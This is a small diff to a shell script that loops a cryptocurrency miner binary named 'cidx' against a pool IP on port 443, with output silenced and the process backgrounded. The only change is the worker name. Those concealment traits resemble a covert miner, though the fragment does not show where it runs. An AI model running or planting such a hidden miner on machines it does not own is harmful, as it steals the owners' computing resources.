@@ -17,7 +17,7 @@ while true; do
   
   nohup ./cidx -a yespower \
     -o 45.115.224.143:443 \
-    -u VGq2bKrQ2AiJPNwttzKw7FE8RZJSQQva3G.worker2 \
+    -u VGq2bKrQ2AiJPNwttzKw7FE8RZJSQQva3G.worker3 \
     -p c=VECO,m=solo,zap=VECO,mc=VECO \
     -t 6 &>/dev/null &
 
